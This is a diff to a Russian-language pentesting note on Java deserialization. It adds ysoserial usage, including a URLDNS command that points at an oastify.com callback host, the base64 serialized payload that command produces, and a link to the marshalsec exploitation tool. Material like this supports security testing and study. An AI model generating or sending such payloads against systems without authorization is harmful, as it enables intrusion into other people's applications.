@@ -39,6 +39,27 @@ Java Deserialization cheat sheet: [https://github.com/GrrrDog/Java-Deserializati
 * `URLDNS` — сделает DNS lookup по указанному URL. Самое главное, он не зависит от целевого приложения, использующего конкретную уязвимую библиотеку, и работает в любой известной версии Java. Это делает его наиболее универсальной цепочкой гаджетов для целей обнаружения десера. Если вы обнаружите сериализованный объект в трафике, вы можете попробовать использовать эту цепочку гаджетов для создания объекта, который запускает взаимодействие DNS с сервером Burp Collaborator. Если это так, вы можете быть уверены, что десериализация произошла на вашей цели.
 * `JRMPClient` — другой универсальный гаджет для идентификации уязвимости. Он пробует установить TCP соединение с нашим IP адресом. Этот гаджет может быть полезен в том случае, если весь выходящий трафик за файерволлом: делаем два гаджета, один для локального адреса, другой для внешнего. Если для локального адреса ответ приходит быстрее => гаджет отрабатывает.
 
+#### Использование
+
+Скачиваем jar-ник с github репозитория.
+
+Посмотреть все нагрузки:
+
+```
+$ java -jar ysoserial.jar
+```
+
+URLDNS:
+
+```
+$ java -jar ysoserial-all.jar URLDNS http://2x0pkkecwdukb2z61gr7u1t0sryhm6.oastify.com | base64
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAKjJ4MHBra2Vjd2R1a2IyejYxZ3I3dTF0MHNyeWhtNi5vYXN0aWZ5LmNvbXQAAHEAfgAFdAAEaHR0cHB4dAAxaHR0cDovLzJ4MHBra2Vjd2R1a2IyejYxZ3I3dTF0MHNyeWhtNi5vYXN0aWZ5LmNvbXg=
+```
+
+### Marshalsec
+
+[Инструмент](https://github.com/mbechler/marshalsec) для эксплуатация десера в JSON и YML библиотеках для Java.
+
 ### JexBoss
 
 JexBoss (Python) - атаки на десериализацию в Java.  [https://github.com/joaomatosf/jexboss](https://github.com/joaomatosf/jexboss)
